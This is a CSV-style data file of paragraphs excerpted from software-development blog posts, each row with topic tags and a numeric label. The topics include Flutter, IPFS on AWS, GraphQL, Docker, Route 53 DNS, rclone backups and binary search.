345,"Debugging is not at its best. You can use the print/debug Print statements, look at logs, and use tools to profile the CPU/memory or visualise the view hierarchy, but were on a different planet in comparison to what you do in Xcode or Android Studio working with the native SDKs. (More about your options in the official docs here. )Correction: a number of people have reported that this point is not correct, and that you can use breakpoints, step through the code and inspect variable values just like with Java/Kotlin Android. This applies to both Android Studio and VSCode. Great news then;)The error screen or logs that you get when theres a layout error (or something else at a lower level) can be very confusing and obscure, as it points to some line of code of the framework that is maybe many levels of abstractions below what you directly interact with. On native i OS and Android, errors are usually clearer to understand, and, if not, you can typically just copy and paste the full error on Google and be reasonably confident that youll get a useful list of links that tell you more. With Flutter, since the community is still relatively small, not so much.","['Flutter', 'iOS App Development', 'Android App Development', 'Mobile App Development', 'Apps']",18
346,"On Android, the vast majority of developers use Clean Architecture and MVP (model-view-presenter). On i OS, it can be MVC, MVVM (model-view-viewmodel) or Viper. In both cases (but even more for Android) there are clear and well known architectural patterns that have proven to work well for large apps. For Flutter (and React Native as well), it feels like its all still being defined, there is no standard or almost-universally-accepted architectural approach. All articles show simple samples, which is normal because they still need to take people onboard before talking about more advanced aspects. However, if you plan to use Flutter for a rather large project, it would be preferable to have a clear idea of how to structure it, so that its scalable and easily maintainable as the app grows in size and complexity. I highly recommend watching this video from Brian Egan to start looking deeper into this (it covers layering your code, Redux and testing) and checking out his samples on Git Hub. I also recommended this article about Streams and Rx Dart by Didier Boelens and these other posts about Redux and overall architectural review. Again, Im definitely not saying Flutter doesnt allow you to build apps with a clean and maintainable architecture, but just that therell be some trial /error / experimentation / study involved, as its not something as mature and widely used as what were accustomed to in native i OS/Android apps.","['Flutter', 'iOS App Development', 'Android App Development', 'Mobile App Development', 'Apps']",19
347,"Before we get going, you might be wondering should I really be using a centralized cloud-server provider to spin up a decentralized IPFS peer? The short answer is: if it helps bootstrap the IPFS ecosystem, I say lets do it! The longer answer might be: well, the IPFS community is all about making the transition to a safer, faster, decentralized Internet at seamless as possible. This means you sometimes have to work within the incumbent system before you can completely break free. Ok, now back to your regular programing First, pop on over to __url__ transfer.","['AWS', 'Ipfs', 'Tutorial', 'Software Development', 'Decentralization']",11
348,"AWS asks you to pick an Amazon machine image (AMI). These are basically virtual machine templates that come pre-installed with a (Linux) operating system. Im going to go with the Ubuntu Server for this demo. By default, this will bring you to the Instance Type page, where you can just stick with the default t2.micro. Go ahead and click Next to Configure Instance Details. Well skip this first page (use defaults), and click on Next: Add Storage. The free tier gives us up to 30 GB of EBS storage, so we might as well use it.","['AWS', 'Ipfs', 'Tutorial', 'Software Development', 'Decentralization']",7
349,"So first things first: lets download the go-ipfs binary (wget), unpack it (tar xvfz), remove the downloaded archive (rm), move it (sudo mv) to a directory where our executable programs are located, and then remove (rm -rf) the unpacked folder (since we no longer need it): The next step is to setup (initialize) our IPFS repo. We do this by first specifying where we want to store our repo (in this case, in /data/ipfs), and then weinit the whole thing. First, well add our repo path to our.bash_profile script and source that (run the code contained in the file). Make sure you actually make the required directory (mkdir), and take ownership of it (chown) before trying to initialize the server (init): Ok, were almost there. Now lets configure out repo a bit. Well increase our storage capacity (Datastore.","['AWS', 'Ipfs', 'Tutorial', 'Software Development', 'Decentralization']",7
350,"Storage Max), and if you want, enable the public gateway. But, you might want to skip this one if allowing people to access files through your gateway makes you nervous: Cool. Were now ready to start our IPFS daemon. But, since this is a cloud compute node, we dont want to have to start and stop things manually. If our instance gets restarted, wed like IPFS to start automatically. So lets set that up using the systemctl service. First, well set up an ipfs.service: And then enable our new service,And start it, and check it out (a sanity check if you will): You should see something like the following, along with the output from the daemon.","['AWS', 'Ipfs', 'Tutorial', 'Software Development', 'Decentralization']",7
351,"I call classic schema stitching here, what seems to be the current, most common way to make schema stitching work. It kind of looks like this: The schema gateway takes n number of schemas, merges them together, and extends the result with these relations weve been talking about. This works well in the sense that each service can be developed without any dependencies on other services, and the final schema is still a well designed schema that allows clients to fetch multiple relations within one Graph QL query. Of course that requires additional glue code, heres what Im talking about using Apollo again as an example: __url__ there.","['GraphQL', 'Api Gateway', 'Api Development', 'Api Design', 'API']",8
352,"Technology is constantly evolving, and at a rapid pace. Its one of the main reasons we are so passionately consumed by the industry. As always, a new technology emerges that changes everything. Facebooks Graph QL is a data query language that completely rethinks models we have all become accustomed to. Providing a complete description of the data in your API, Graph QL gives applications the power to query exactly what they need, allowing the application to evolve and iterate without the need for fundamental changes to the content structure. Rather than having a set of API endpoints that can be queried in order to receive subsets of data, Graph QL allows applications to query the data and relationships they require.","['Web Development', 'Content Management', 'Content Marketing', 'Technology', 'Mobile']",17
353,"Were helping our brethren in the Exchange team improve their quality. In fact, were going to take yet another cross-group dependency, requiring Exchange Server to run on beta versions of Windows Server. If the Windows team can help improve the quality of Exchange, so too can the Exchange team help improve the quality of the next release of Windows.","['Product Management', 'Cloud Computing', 'Quality', 'Testing', 'Software Development']",10
354,"So does writing tests first slow down the development? Without writing the tests, when do you know when you are finished? Does it cover the edge case scenarios? When trying to extend an app, wouldnt it be nice if you can extend it and know you didnt break the previous behaviours? Development cycle will be faster, in the long run and as TDD becomes a habit, speed is not that different either.","['Software Development', 'Programming', 'Tdd']",13
355,"(Cover photo by Tobias A. Mller)There are a ton of best practices preached when talking about authoring software. Ways to improve performance, readability, maintainability, flexibility. Much of the advice is more dogmatic than pragmatic, though. When youre actually shipping features, what you really need is code that isnt a mass of spaghetti and performs well enough to be useful. Adhering to all the best practices wont always improve the quality of the end product.","['Software Development', 'Programming', 'JavaScript', 'Development']",9
356,"Think about the problem at hand for a minute. Define what the outcome youre trying to achieve is, and how the code youre going to write will accomplish that. This could be a written specification, a wireframe, a swagger definition, a mind mapping diagram, a pro and cons list (or even several of these!). If you dont have a preferred way of thinking about code, try out different strategies until you find what helps you. At work, my team lead wrote a spec template with 5 or 6 questions on it. Im a frontend developer using React, so the questions are geared for that area of development. Its very helpful for getting the words flowing, though often most of the questions dont end up being directly answered.","['Software Development', 'Programming', 'JavaScript', 'Development']",9
357,"Once your pile of trash has begun to have some good structure and clearly defined responsibilities, start polishing those parts. I would call polishing code any changes that dont directly affect its correctness. You might add some inline comments to clarify why the code is written the way it is. Revise variable names to clarify their purpose. Add some documentation about how to use it. Profile performance and optimize hot code paths. If youre writing a UI component, you might add more subtle visual effects and animations.","['Software Development', 'Programming', 'JavaScript', 'Development']",9
358,"Imagine the chaos if professors could do thatyou finished your project, but he/she comes back saying the task has changed. Now that I think about it, maybe they should In the real world of agile development, it is idealistic to think that youll have every requirement you need beforehand. Companies follow this process to provide iterative feedback on the products they are building. Users may change their mind about a feature, or a market can change, causing product owners to need to switch gears. These scenarios of course dont happen in a classroom project, and new devs may have trouble adjusting to this mode of work after graduation. (But you wont because you read this post, right? )Ask the standard CS student how they prepare for interviews and they will mention studying data structures and algorithms. Most tech companies include whiteboard programming questions in interviews, usually ones where they ask questions such as reversing a linked list or binary tree traversals. Used to assess applicants on their technical capability and thought process, most actual software engineering jobs dont involve that much complex manipulations with data structures. This can be misleading to students, as that is how theyre trained to study for software engineering interviews.","['Tech Education', 'First Jobs Out Of College', 'Technology', 'Student Life', 'Programming']",12
359,"I grew up so used to the schedule of attending classes that starting work was a serious change of habit. At school, your goal is to learn and get good grades. At work your goal is to help the company achieve a goal. The focus isnt on you anymore, not exactly anyway, but on how you can contribute to your team. In the classroom, your success is independent from the student next to you. But in the workplace, where your whole project is at stake, youre highly dependent on the work of peers to get things done and accomplish your goals.","['Tech Education', 'First Jobs Out Of College', 'Technology', 'Student Life', 'Programming']",4
360,"Change means my having to do something new; to learn something new, to struggle with my brains natural tendency to favour what came before. Change means there is risk, or uncertainty. Change is, from an evolutionary perspective, usually bad. Change is a vicious predator, or a poisonous plant, or a dried-up riverbed. People avoid change in most cases because it doesnt feel good to deviate from what one knows and does regularly. In a company, where one person might grumble a bit over a change; the larger the organisation, the more the resistance grows to change.","['Software Development', 'Technology', 'DevOps', 'Advice', 'Business Development']",4
361,"Does HTTP suit my project best? Do I fully understand the concept of a resource? Can I move away from only accepting GET requests? Will my clients make use of all the RESTful HTTP verbs and use my API accordingly? Keep in mind that Roy Fielding is very serious about this. HATEOAS or Hypermedia As The Engine Of Application State, or more simply, every response from your API should include links that expose the next steps that a client can take. For example, I request the Facebook API to return a simple Facebook post. The resource found in the response body should have links attached, that allow me to see which actions are available for that post, actions like liking the post or sharing it. An API with HATEOAS can be used by without needing any further documentation for the API.","['API', 'Rest', 'Software Architecture', 'Introduction']",19
362,"Will my API be used internally and the developers of different applications can easily communicate, and actually exposing links might actually not be needed as it increases the size of the payload, the complexity of the code and the development time. Can those links just be exposed through actual API documentation or just plain good communication? We can have lots of particular requirements for our API/Project, the first step is to carefully analyze it. I can give you three examples: Will the API be mostly CRUD (creating, removing, updating and deleting resources), manipulating data and aiming to be consumed by a lot of clients? Then it probably should be REST, also REST has layersyou can pick what suits your app best, but please dont fall into the marketing trap and call your API RESTful if it does not fully align with the architecture.","['API', 'Rest', 'Software Architecture', 'Introduction']",19
363,"Lets make an api that represents a lunchbox that holds food. The lunchbox will be our context that handles our food items. The food will have a name:string and have a status:string to keep it simple. Lets fix those!next we need to setup auth for tests and take care of adding auth to the conn, add the following code to your food_controller_ __url__ you run $ mix test you will notice some tests are still failing, we now need to utilize our recycle conn func to get auth headers back on the conn for more reading see. Phoenix Docs for Conn Testyour final food_test_ __url__ file should look like this and all tests should be passing __url__ adding auth to the conn only makes some tests pass, to make all of them pass we utilize the conn func recycle/1time to check everything out in devadd config for basic_auth to config/dev.exsyou can also __url__ instead of hardcoding with something likeusername: System.get_env(BASIC_AUTH_USERNAME)password: System.get_env(BASIC_AUTH_PASSWORD)fire up your local server $mix phx.server and postmansend a get request to http://localhost:4000/api/v1/foods,dont forget to set auth headers!your expectation is to see a response of {data:[]} just like beforenow lets test storing a food, make sure to set the body in postman to `raw` and change `text` to `JSON (application/json)`your expectation is to see your new food item returned in the response {data:{status:really old,name:cheese,id:1}}success!!","['Elixir', 'Phoenix Framework', 'Distillery', 'Gigalixir', 'Api Development']",15
364,"You discover that documentation is one of those technical places that doesnt feel mechanical. The Python Community looks like it has always managed to be human and professional (despite being open source, that says a lot about discipline); Flask, Requests, The Hitchhikers Guide to Python itself. Engaging writing style doesnt even begin to describe them. The folks over at Write the Docs are a great resource for how to write docs while demonstrating it themselves. Bootstrap and Vue are amazing projects that use use-cases to clarify the intent of their decisions. Yarn, on the other hand, is a good example of to-the-point reference of all it has to offer. In the realm of small utilities, Blissful Js is a fresh one to capture attention on how it eases your use of native Javascript.","['Web Development', 'Documentation', 'Programming']",19
365,"After all that imbibing, you allow yourself some time to begin composing. To quote Mr. Holmes: You imagine your README as a summary of the stuff youd like to cover. That means youve gotten things like Installation, Get Started and Configuration down. So now its about the real meat, the API in depth. But its already been too late to follow RDD and for all of Kenneths talks, youre here to start them after coding stuff in.","['Web Development', 'Documentation', 'Programming']",18
366,"In a previous article I argued that Kubernetes is extremely hard to run. Many people have rightfully asked why someone would even bother with using Kubernetes? Isnt it all just a hype train that people have jumped on and are heading right for that proverbial cliff? Sure enough, Kubernetes (k8s) is on the top of the Gartner Hype Cycle. Many newly created Dev Ops teams are facing inevitable disappointment. (You know, the ones that have been rebranded Dev Ops because it sounds cooler. )Nevertheless, Kubernetes does provide tremendous value if used right. Lets take a gander what these values are and why you might want to care about them.","['Docker', 'Kubernetes', 'DevOps']",10
367,"In order to have this kind of flexibility, you still need to do things right. Your containers need to be built in such a way that you can configure them dynamically. Your YAML files need to be written with the expectation that there will be multiple environments. The deployment process needs to be integrated into your CI system so pulling up an environment is easy. After all, if its too hard or time consuming, nobody will do it.","['Docker', 'Kubernetes', 'DevOps']",18
368,"Every project exists to fulfill a need, and until you understand that need, you cant make a successful plan, much less build an application to satisfy it. Moving forward without understanding the projects goals is like trying to play darts with your eyes closed. You might be really good, but you have no idea what youre aiming for. It sounds basic, but its so often overlooked that I feel the need to point it out here. Tell me youve never seen this scenario: Manager: We need a micro-service framework built in COBOL that reads XML from a SOAP service and translates it into UTF-8 encoded Swahili before it increments a hexadecimal counter in a brand new No-SQL database and displays the total on our website using non-standard emoji. ]We engineers tend to take the spec doc at face value. In default mode, well usually just put our heads down, turn up the music, and start building something without ever asking questions like, Why are COBOL and Swahili even required? Sometimes we can get away with that. If the project is small and were lucky.","['Programming', 'Engineering']",9
369,"When youre hunting for these unidentified questions, remember that the devil is almost always in the details. If, for example, the spec calls for a blog with a commenting system, I can almost guarantee that one or more of the following questions has not been answered: Must users authenticate before commenting? And if so, have we accounted for how that will happen? Are we integrating with any social APIs to allow people to authenticate using, say, their Facebook or Twitter account? Do individual comments need approval before appearing on the public site? If so, does that apply to all commenters, or just some? Do we need to create an admin interface or administrative user role to support comment approval? Can comments be turned off for a post before it goes public? What about for a post that is already public? And if a post already has public comments, what happens if we turn off commenting then? Do the existing comments disappear, or do we just remove the comment creation form? Can commenters reply to existing comments? If so, how deep can a reply thread go? Have we accounted for nested comments in design across all screen sizes? Do we have a plan for dealing with inappropriate/abusive language in comments and/or problem commenters? That list could go on and on. Every question you ask can, potentially, unearth several more questions that need to be asked. It can be daunting, I know. Its tempting to skip this step, make assumptions, and get something out the door, but you know what happens when we assumebad things, man. So take the time to really think through the projects requirements and figure out which decisions still need to be made before you start your build.","['Programming', 'Engineering']",19
370,"Once you have most of your questions answered (because lets be honest, youll never get all of your questions answered up front), you can start to organize your plan. Are there database changes to be made? Create a document called Database Changes, add a bullet point or two to summarize what the changes will need to accomplish, and set aside some time on your schedule to think through specifics later (in step 4). What are the modules/classes that will need to be modified or created? Are there pieces that will depend on other teams? Note them, and communicate these requirements to the affected teams or your PM. For each piece you or your team will need to build, make a rough, high-level outline of what will need to be accomplished. Sometimes this will send you back to step 2 with fresh questions, and thats fine. Surface them, and move on to the next functional piece.","['Programming', 'Engineering']",0
371,"Make a list (and check it twice) of every task (naughty or niceokay, Ill quit now) that will need to be accomplished to complete the functional pieces you just outlined. They dont have to be listed in order of execution as long as you feel everything is covered. When youre done, you should have something that looks like this: Create a database table to store comments. Should include a unique ID, the date/time the comment was posted, the ID of the post being commented upon, the commenters user ID, the ID of the comment being replied to if applicable, and the text contents of the comment. Be sure to follow our organizational standards and naming conventions.","['Programming', 'Engineering']",15
372,"Maybe you estimate effort in terms other than time. I, personally, am unable to think in any other units, so this is what I do. But the goal is to create a list that you (and your manager) can track against. When a PM asks you how the project is going, you can say, Well, Ive accomplished X number of tasks so far. I am currently ahead of/behind schedule, and I have X number of hours/days/units of effort remaining in the project. Thats so much more helpful than the usual, Umm, well, I think Im probably on track. )And again, it is possible (probable?) that you will uncover more questions that should have been asked in step 2 or new functional pieces that should have been outlined in step 3. Surface them now, rinse and repeat.","['Programming', 'Engineering']",0
373,"There are different philosophies and ways of writing pseudocode, and I dont want to be prescriptive about style. For me, what matters is that my pseudocode (A) contains no actual code, and (B) can continue its life as comments in my code when the project is built. I dont even worry too much about design patterns or best practices here. I just get the logic down. An example of pseudocode, the way I write it, would look something like this: Then, if you have a colleague or friend who is willing, have another engineer check your logic for flaws before you execute.","['Programming', 'Engineering']",9
374,"Now its finally time to write some code! Having taken the previous steps, you can now bask in the glory of knowing you wont have to stop mid-project to ask a question about scope or even figure out how the application should work. All youll have to worry about is writing the cleanest, DRY-est, most testable and efficient code you can write. Thats enough on its own, isnt it? And just imagine, with that kind of focus, how much more smoothly your code reviews will go and how many fewer misunderstandings and bugs that are really I built this incorrectly errors youll have to deal with now.","['Programming', 'Engineering']",9
375,"Then, you can start the docker container by running the following. (As mentioned in step 1, you can actually jump straight to below command. It will automatically do docker pull to pull the mysql image)Let me explain the parameters in the command above:--name: this is optional. It specifies the name of the running docker container--env: this is required, otherwise you would see the following error. As from the error message, you can choose to specify any of the MYSQL_ROOT_PASSWORD, MYSQL_ALLOW_EMPTY_PASSWORD and MYSQL_RANDOM_ROOT_PASSWORD.-p: this is to specify that you want to expose port 3306 in the docker container to the outside world on port 3306. One thing to note is if you already have a running mysql, you would need to either specify a different port for the outside world or terminate the running mysql. The format of this parameter is as follows host Port:container Port.-d: this is to indicate you want to detach the running docker or in other words, running the docker in the background.","['Docker', 'MySQL', 'Python', 'Software Development', 'Software']",7
376,"We were hoping that Appreciative Interviews would help us overcome the negative attitude towards change. Prior to the team formation day, Appreciative Interviews were conducted on a 1:1 basis by the Scrum Masters with all team members involved in the change. The interviews are 1:1 because it creates safety, everybody is heard and it brings us an intimate recollection of experiences. We prepared a set of interview questions to guide the interviewee to remember a great team experience, thinking about what and who made this experience special and how we could apply this to our current situation. Scrum masters collected the interview results and used colored markers to identify patterns (e.g. The patterns and most inspiring stories we collected were combined in the opening talk of the team formation day. Some attendees chipped in and shared their experiences. The stage was set to move toward something new and more enjoyable for all of us. The people were engaged in finding new team-mates to recreate their best team experience.","['Scrum', 'Training', 'Psm', 'Serious Scrum', 'Scrum Master']",0
377,"Notes for conducting the interviews: Keep the interview very concrete. We need names and real people, not inventions. It is very important the interviewee talks about a past experience. If the interviewee cannot remember a great team experience, stop the interview. Spend time on formulating good interview questions. Practice the interviews among all interviewers until the questions and your techniques are in place.","['Scrum', 'Training', 'Psm', 'Serious Scrum', 'Scrum Master']",0
378,"Service tests significantly reduce feedback loops while empowering developers to verify their services locally. Relying on complex production-like environment to verify a service is extremely expensive: Scenario: Verification in production-like environment anti pattern Many organizations Ive worked with have a concept of verifying a feature when it is in a production like environment (qa, stag, canary, etc). While I think this is generally valuable this is often where the majority of the verification takes place: Verification in this anti pattern encompasses a full build and deploy and has a number of problems: Expensive: Timethere is the overhead of the build and deploys, waiting for each stage and monitoring the service potentially sifting through unrelated logs/metrics Indirect: Running in a production like environment involves interacting with all other services Interacting with service indirectly, observation indirectly, through logging metrics Difficult Interactions (Overhead): The position of some services within an architecture doesnt lend well to exercising directly, and in some cases there may not even be a way to exercise directly! Take a queue based service which since in the middle of a pipeline for example. If the only path to the service are is through its upstream dependencies it increases testing difficulties. Testing an architecture like this requires indirect observation and/or may not even be possible. In this case the only way to test may be to send a message to the beginning of a pipeline.","['DevOps', 'Software', 'Software Development', 'Software Testing', 'Software Engineering']",13
379,"Since service test stack creates hermetic repeatable environments, it is trivial to use the same commands for both local development and CI. Since configuration is kept up to date by being enforced in CI it creates a virtuous documentation cycle: This cycle allows tooling to be kept up to date by executing it as part of CI. Because its enforced in CI theres automated feedback on when tooling has changed. Service tests enable this cycle by exposing commands that can be executed both locally and in CI. These bring up the service in a known good state and execute tests. Since the same commands are executed locally as in CI they are kept up to date.","['DevOps', 'Software', 'Software Development', 'Software Testing', 'Software Engineering']",18
380,"Go is extremely well suited for service level tests, timeouts, async options, all have primitives in go. Go has a number of properties that make it a great environment to write service tests in: Concurrency is a first class citizen. This is necessary since queue based service tests require sending input and receiving output from the same process: Trivial to support global timeouts using context. A global timeout can be enforced using a context, so that each network call uses the global context and will preempt and close when the timeout is reached. The following example is from the docs: Distribution is easy, static binary. While this isnt a deal breaker its just so much easier to work with building and distribution than interpreted languages.","['DevOps', 'Software', 'Software Development', 'Software Testing', 'Software Engineering']",3
381,"In my previous article, we have seen how to create a basic FFU image which can be flashed to SD cards. Today, we will see how we can package our application and add this to our existing Io T Core OS image. If you havent read my previous articles on the same topic, I strongly recommend you to read so that we can make sure that we both are in the same boat. For now, lets just start doing some amazing things.","['Raspberry Pi', 'IoT', 'Windows 10 Iot Core', 'Sd Card Provisioning', 'Powershell']",6
382,"The way we experience content has been revolutionized by streaming services available across the Internet. In the past, recommendations focused on presenting you with content for future use. The modern streaming platforms instead focus on recommending content that can and will be enjoyed at the moment. The streaming models bring to the table new methods of discovery in the form of personalized radio and recommended playlists. The focus here is on generating sequences of songs that gel. To enhance user-experience the recommendation systems model should capture not only what songs similar people generally interested in, but also what songs are listened to frequently together in very similar contexts.","['Machine Learning', 'Artificial Intelligence', 'NLP', 'Word Embeddings']",17
383,"Running docker in your terminal will give you a long list of commands you can use to manage your Docker assets. Let's look at a few: Returns a list of running containers Ok, so we see nothing. Thats because we have no containers running. Lets run our first container using a predefined image we can pull from Dockers repository. This command allows you to pull prebuilt images from repositories like Docker Hub. Lets see all the images we have loaded on our machine.","['DevOps', 'Docker', 'Development']",7
384,"The language seemed to have primitives for concepts like services and endpoints. It looked like most of the boilerplate I was so sick of writing had been codified directly in the language as first-class citizens. Part of what I do is figure out which new things will have an impact on me, my team, my company, or my side projects outside of work. Ive seen gimmicky languages before and this felt like one with its sequence diagram visualization, so I went back to learning stuff from more mature ecosystems and, to be clear, Ballerina is very, very young.","['Grpc', 'Ballerina', 'Ballerinalang', 'Microservices', 'Cloud Native']",2
385,"Then I saw a blog post that caught my eye and I started reading. Ballerina wasnt just a set of libraries to do common cloud native things. It has a deeply ingrained lightweight threading system (e.g. coroutines/goroutines) that is used everywhere (apparently every function has a default worker, though you dont see it in the code). The sequence diagrams are aware of parallelism and werent designed to be shown to non-technical people, they were designed to help facilitate communication among service developers. It brands itself as a cloud native integration language.","['Grpc', 'Ballerina', 'Ballerinalang', 'Microservices', 'Cloud Native']",9
386,"The map bugs me a little. In Rust, Id define Map<String, Drone Info> so this threw me a bit. The key here is a string. Im not sure how Id use a non-string keyed map, but Ill put that on my to-research list for later. Ill be replacing that when I use a real database, so its low priority for me.","['Grpc', 'Ballerina', 'Ballerinalang', 'Microservices', 'Cloud Native']",15
387,"The but syntax got me hung up initially. This is one means by which Ballerina deals with optional types (indicated with a? Map access might fail, so the indexing operation returns an optional, sodrones Map[drone Id] but { () => {} }actually returns the real value, but in the absence of a value ( e.g. ()), it returns what I think is an empty record {} via pattern matching. I havent quite figured out Ballerina pattern matching, except to notice that I cant declare new data and destructure at the same time I have to declare variables and then destructure into them. Rust lets me destructure directly into variables that are then immediately available within that lexical scope, so it makes for smoother code.","['Grpc', 'Ballerina', 'Ballerinalang', 'Microservices', 'Cloud Native']",15
388,"What about that visualization gimmick that I mentioned earlier? I am the first one to admit when Im wrong, and I was wrong. Take a look at the sequence diagram for the client: I was pretty impressed when I saw that. But, I may have snorted a little coffee when I looked at the sequence diagram (generated right inside VSCode!) for the server: I am definitely intrigued enough to keep going with this experiment, and so I will definitely try and hook this service up to a real database and Ill post again my thoughts on the experience and what Ive learned.","['Grpc', 'Ballerina', 'Ballerinalang', 'Microservices', 'Cloud Native']",19
389,"My support role was directly working with our CX team to help triage customer facing issues as the bugs and questions were being reported. This was so much better than any formal onboarding that Ive ever been a part of. I learned so many different pieces of the code base in such a short amount of time, and as a result, I forgot a bunch of it. But staying on this team for my first couple of months with the company was vital to learning all the different ways that we do things. This showed me that I am a trusted member of this team. I asked questions, got answers, and made decisions on my own based on the things that I had learned. The team never pushed back, gave constructive criticism in code reviews when I went off the rails on my solution and gave me all their trust.","['Work Life Balance', 'Software Development', 'Company Culture', 'Professional Development', 'Software Engineering']",0
390,"If you had come up and told me that I was going to be a software engineer when I was in my final year of high school I would have told you that you were out of your damn mind. I had no idea what that entailed, and I was very much riding the you need to be a doctor bus. Now if you were to come up and tell me that I should have been a doctor, I would tell you that you are out of your damn mind. I now have hopes to prevent this from happening in the future. Once Im a bit more settled in life I want to be the one who helps introduce young people to the joys of software and more broadly of being an engineer. Solving problems for a living can sometimes feel like youre playing a giant game! I want to be the one who helps show kids who are starting to think about their future just how fun my recently found tech lifestyle can be.","['Work Life Balance', 'Software Development', 'Company Culture', 'Professional Development', 'Software Engineering']",2
391,"My environment is a Maria DB cluster consisting of EC2-based and on-premises instances. Maria DB default way of managing the encryption key is to place it in a local file. Since I have access to AWS services, I decided to use the Key Management Server (KMS) instead. This is a more (not most though) secure configuration. This post is only about my experience setting up data-at-rest encryption in a Maria DB cluster (specifically using AWS KMS for encryption key management). It does not solve or address all security issues.","['AWS', 'Aws Kms', 'Mariadb', 'Security']",11
392,How do we solve this problem in general? A few obvious approaches would be to either add more servers or upscale the hardware. Is the data being served from the other service needed in real time that every single time a request has to be made? These are few questions every application developer must consider. It is not necessary that the configurations or values that we fetch from the other service may update frequently (or every second). That is where things could be optimized.,"['Distributed Systems', 'Golang', 'Software Development', 'Software Engineering', 'Adtech']",1
393,"High frequency trading systems had always intrigued me as they are limited by the same problems. But they seem to overcome it and provide responses in real time. Here are a few points to note when building a HFT platform: Optimize code for performance Keep everything in memory Keep hardware unutilized Keep reads sequential, utilize cache locality Do async work as much as possible Keeping everything in memory is a good viable option for us since in most of our cases, the RAM remained underutilized compared to the cores. Remember, Service A requests data every single time from Service B, but Service Bs data doesnt change frequently. When updates/writes are not very frequent, one could cache the response from one service locally for a few minutes to avoid requesting the other service for the same data again and again. Similar to how L2/L3 cache works on a processor to avoid requesting from main memory/disk all the time, the same idea can be applied at a service level to increase the traffic for better response times.","['Distributed Systems', 'Golang', 'Software Development', 'Software Engineering', 'Adtech']",8
394,"If login is successful, we can now push our docker image to the repository created in ECR. It may take a few minutes depending on the size of the completed image: Once the image has been created, were going to allow anyone to access the image from ECR. Permission should be locked down in a production environment but for this example were going to allow it to be open. Navigate to the Permissions tab in the AWS Console, select Edit policy JSON and paste in this policy: Its time to build the pipeline. To make this easier and repeatedly deployable, and in the true form of serverless architectures, Ive built the pipeline using the serverless framework. You could also achieve the same thing by building it in Cloud Formation.","['Docker', 'Cloud Computing', 'AWS', 'Software Development', 'DevOps']",7
395,"As an example, lets say I have the private DNS zone __url__ hosted in Route 53. I go through the process of configuring an inbound endpoint in my VPC, and I chose to create endpoints in 2 subnets, across 2 availability zones. The inbound endpoint interfaces each get an IP address assigned: 10.10.1.5 and 10.10.2.5. I can now take these 2 IP addresses, go into my on-premise DNS solution, and create a conditional forwarder which says For any DNS requests with the prefix cloud.acmecorp.com, send the resolution request to either 10.10.1.5 or 10.10.2.5. These requests will then be routed over your Direct Connect or VPN, in to your AWS VPC, and now youre resolving DNS requests for a private zone in Route 53 with no extra services required! Modifying your DNS configuration to take advantage of inbound endpoints If you previously set up services in your VPC, such as Windows DNS, Unbound, or BIND, to handle forwarding requests destined for Route 53 private zones, you can now remove these. In your on-premise DNS, wherever you have forwarders pointing at these intermediate DNS services, you should update the forwarding IP addresses to point directly to your inbound endpoint IPs.","['AWS', 'Route 53', 'DNS', 'Cloud Computing']",11
396,"With outbound endpoints, you can configure custom DNS forwarders for your VPC directly within Route 53, allowing you to leave all of your services hosted in AWS pointed directly to Route 53 for DNS resolution. Yes, you read that correctly: assuming your EC2 instances are not already using a custom DNS configuration, they are already using the Route 53 resolver! Configuration of outbound endpoints is equally as easy as setting up inbound endpoints. Within the console, youll find the new Route 53 resolver configuration options within the Route 53 service console. For each outbound endpoint, you pick a subnet, security group(s) to place on the endpoint, and then decide whether to assign a static IP or let AWS choose one for you. Its recommended to create multiple outbound endpoints, each in a separate availability zone, to ensure high availability of your endpoints. These IPs are not as important as the inbound endpoint IPs, as theyre only ever used for routing DNS requests on your behalf in to Route 53you dont actually need to list them anywhere for this to start working. As long as youve not created any custom DNS configuration, EC2 instances in the VPC where the rule was created will automatically use that rule. The only potential place you may need to use these IPs, is if youre whitelisting them on your on-premise firewall to allow DNS traffic from AWS.","['AWS', 'Route 53', 'DNS', 'Cloud Computing']",11
397,"If you decide to do so, share a specific folder (e.g. shared_folder) in your Google Drive with the service account. As your service account name looks like an email address (e.g. name-of-your-sa-account@your-project-name-123456.iam.gserviceaccount.com) you can share the copy folder in the Google Drive web UI. Just add the service account email as an additional user to the copy folder. You may receive an automated email stating that the service account email is not reachable, but it will work nevertheless.","['Cloud Storage', 'Google Drive', 'Google Cloud Platform', 'How To']",7
398,"From now on you can advise rclone to access this shared folder using the drive-shared-with-me flag. This works for all rclone commands (see official documentation). Heres an example: On QNAP devices the rclone configuration is stored at /root/.config/rclone/rclone.conf. As this location will be wiped after NAS restart or latest after a NAS upgrade, you need to manually copy the __url__ file at a different location, e.g. Please note: anytime you change the configuration or create a new one using rclone config, you need to save the configuration again at a durable location.","['Cloud Storage', 'Google Drive', 'Google Cloud Platform', 'How To']",7
399,"Rclone supports several file manipulation commands. Id like to quickly highlight the difference between copy and sync and make clear that currently there is no snapshot feature! Well, this command copies files, ignoring unchanged ones, utilizing file size and modification time. Important for our use case: this command does never ever delete a file at the target location. Even if the file was deleted at the source. But it does overwrite changed files! I use copy in this guide.","['Cloud Storage', 'Google Drive', 'Google Cloud Platform', 'How To']",18
400,"Please note, bandwidth limitation doesnt work for me. A quick research showed this might be a common bug. Therefore I use my router to control bandwidth usage by utilizing Quality of Service settings. It is important to keep plenty of spare upload. Otherwise your download might get affected, including e.g.","['Cloud Storage', 'Google Drive', 'Google Cloud Platform', 'How To']",11
401,"Marketable means you are valuable, or you add value to the market. But who is the market any way? Any and everyone your trying to reach. Rather there is a better term for this target audience. This means that you specialize to a specific group of people, in other words your niche.","['Social Media Marketing', 'Digital Marketing', 'Marketing', 'Front End Development', 'Value Proposition']",12
402,"What about we use binary search? And what is a binary search? From Wikipedia, Binary search compares the target value to the middle element of the array; if they are unequal, the half in which the target cannot lie is eliminated and the search continues on the remaining half until the target value is found. If the search ends with the remaining half being empty, the target is not in the array. Lets draw it out to demonstrate: Say we have the same array and we want to search for 70: At first step, we find the midpoint, and divide it in half, so visually we have: We search in the first half, 70 is not in them. So lets ignore it, and for the second half, we find the midpoint and divide it in half again. And since it has odd number of elements, lets also include the median number (we can also not include the median number, it wont make a real difference since the other half will include it then), so now we have: For our new first half, lets search for 70, it is still not in them. So lets again ignore it, and find the midpoint and divide it in half on the second half. Now we have: And this time, 70 is in the new first half. We have completed a binary search.","['Algorithms', 'Binary Search', 'Programming']",14
